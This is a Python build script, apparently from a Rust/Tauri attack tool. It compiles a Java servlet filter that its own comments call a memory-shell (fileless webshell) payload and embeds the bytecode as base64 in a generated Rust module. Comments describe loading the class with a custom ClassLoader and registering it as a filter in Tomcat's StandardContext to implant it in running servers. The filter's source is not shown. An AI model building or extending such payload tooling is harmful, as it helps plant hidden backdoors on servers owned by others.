"""为 `TokenFilter.java` 生成最小 servlet API stub 并编译出 .class，再生成 Rust 内嵌常量。

为什么要 stub：本机/CI 没有 servlet-api.jar。Filter 必须 `implements javax.servlet.Filter`
才能被 Tomcat 接受，所以编译期需要这些类型存在；运行时由容器提供真正的实现（二进制兼容）。
stub 只在编译载荷时使用，不随程序发布。
"""

import base64
import hashlib
import shutil
import subprocess
import sys
from pathlib import Path

ROOT = Path("src-tauri/src/memshell/payload")
OUT = ROOT / "out"
STUBS = OUT / "stubs"

STUB_SOURCES = {
    "javax/servlet/FilterConfig.java": """package javax.servlet;
public interface FilterConfig { String getInitParameter(String name); }
""",
    "javax/servlet/ServletException.java": """package javax.servlet;
public class ServletException extends Exception {
    public ServletException() { super(); }
}
""",
    "javax/servlet/Filter.java": """package javax.servlet;
import java.io.IOException;
public interface Filter {
    void init(FilterConfig config) throws ServletException;
    void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException;
    void destroy();
}
""",
    "javax/servlet/FilterChain.java": """package javax.servlet;
import java.io.IOException;
public interface FilterChain {
    void doFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException;
}
""",
    "javax/servlet/ServletRequest.java": """package javax.servlet;
public interface ServletRequest { }
""",
    "javax/servlet/ServletResponse.java": """package javax.servlet;
import java.io.PrintWriter;
public interface ServletResponse {
    PrintWriter getWriter() throws java.io.IOException;
    void setContentType(String type);
    void setHeader(String name, String value);
}
""",
    "javax/servlet/http/HttpServletRequest.java": """package javax.servlet.http;
import javax.servlet.ServletRequest;
public interface HttpServletRequest extends ServletRequest {
    String getHeader(String name);
    String getParameter(String name);
}
""",
    "javax/servlet/http/HttpServletResponse.java": """package javax.servlet.http;
import javax.servlet.ServletResponse;
public interface HttpServletResponse extends ServletResponse {
    void setStatus(int code);
}
""",
}

for relative, source in STUB_SOURCES.items():
    target = STUBS / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(source, encoding="utf-8")

classes = OUT / "classes"
if classes.exists():
    shutil.rmtree(classes)
classes.mkdir(parents=True)

sources = [str(path) for path in STUBS.rglob("*.java")]
sources.append(str(ROOT / "TokenFilter.java"))

result = subprocess.run(
    ["javac", "-encoding", "UTF-8", "-source", "8", "-target", "8", "-nowarn", "-d", str(classes), *sources],
    capture_output=True,
    text=True,
)
if result.returncode != 0:
    print(result.stdout)
    print(result.stderr)
    sys.exit(result.returncode)

class_file = classes / "dsw" / "TokenFilter.class"
data = class_file.read_bytes()
if not data.startswith(b"\xca\xfe\xba\xbe"):
    print("不是合法的 JVM class 文件")
    sys.exit(1)

encoded = base64.b64encode(data).decode("ascii")
source_bytes = bytes(byte for byte in (ROOT / "TokenFilter.java").read_bytes() if byte != 13)
source_hash = hashlib.md5(source_bytes).hexdigest()
# 每行 100 字符，便于 code review 时肉眼比对，也让 git diff 更可读
lines = [encoded[i : i + 100] for i in range(0, len(encoded), 100)]
body = "\n".join(f'    "{line}",' for line in lines)

rust = f'''#![allow(dead_code)] // 载荷已生成，待接入 StandardContext 注册流程（见 memshell/java.rs）
//! Java 内存马载荷的**已编译字节码**（由 `payload/TokenFilter.java` 生成）。
//!
//! 为什么内嵌：`FilterDef` 需要一个 `javax.servlet.Filter` 实例，运行期无法凭空造出实现类，
//! 只能由自定义 `ClassLoader.defineClass` 加载内嵌字节码。
//!
//! **不要手改本文件**。源码在 `payload/TokenFilter.java`，重新生成：
//! ```text
//! python scripts/gen_java_payload.py
//! ```
//! `cargo test` 里的漂移用例会比对源码哈希，源码改了却忘记重新生成时测试会失败。

//! 类名：`dsw.TokenFilter`（{len(data)} 字节，编译目标 Java 8）。

/// 生成本常量时 `payload/TokenFilter.java` 的 MD5。用于防止
/// 「改了 Java 源码却忘记重新生成字节码」——这类漂移在发布里最难发现。
pub const FILTER_SOURCE_MD5: &str = "{source_hash}";

/// 载荷类名（注册 FilterDef 时需要）。
pub const FILTER_CLASS_NAME: &str = "dsw.TokenFilter";

/// 已编译字节码的 base64（分行存放，便于评审与 diff）。
const FILTER_CLASS_B64: &str = concat!(
{body}
);

/// 解码后的字节码。
pub fn filter_class_bytes() -> Vec<u8> {{
    use base64::Engine;
    base64::engine::general_purpose::STANDARD
        .decode(FILTER_CLASS_B64.replace('\\n', ""))
        .unwrap_or_default()
}}

/// 源码（`include_str!`）：供漂移测试比对，也方便排查线上载荷版本。
pub const FILTER_SOURCE: &str = include_str!("payload/TokenFilter.java");

#[cfg(test)]
mod drift_tests {{
    /// 源码改动后必须重新生成字节码，否则这里失败。
    #[test]
    fn embedded_bytes_match_source_revision() {{
        // 过滤 CR：checkout 行尾随平台而变，不归一化会让本地与 CI 的哈希不同。
        // 用 char::from(13) 而不是字符字面量，避免模板生成时的转义问题。
        let normalized: String = super::FILTER_SOURCE
            .chars()
            .filter(|ch| *ch != char::from(13))
            .collect();
        let digest = dosword_sdk::encoder::md5_hex(&normalized);
        assert_eq!(
            digest,
            super::FILTER_SOURCE_MD5,
            "TokenFilter.java 已变更但字节码未重新生成：请运行 python scripts/gen_java_payload.py"
        );
    }}

    /// 内嵌字节码必须是合法 class（CAFEBABE），且类名与常量一致。
    #[test]
    fn embedded_class_is_valid_and_named() {{
        let bytes = super::filter_class_bytes();
        assert!(
            bytes.starts_with(&[0xca, 0xfe, 0xba, 0xbe]),
            "不是 JVM class 文件"
        );
        let needle = super::FILTER_CLASS_NAME.as_bytes();
        assert!(
            bytes.windows(needle.len()).any(|window| window == needle),
            "class 里找不到 {{}}",
            super::FILTER_CLASS_NAME
        );
    }}
}}
'''

target = Path("src-tauri/src/memshell/java_payload.rs")
target.write_text(rust, encoding="utf-8", newline="")
shutil.rmtree(OUT, ignore_errors=True)
print(f"已生成 {target}（{len(data)} 字节 class，base64 {len(encoded)} 字符）")
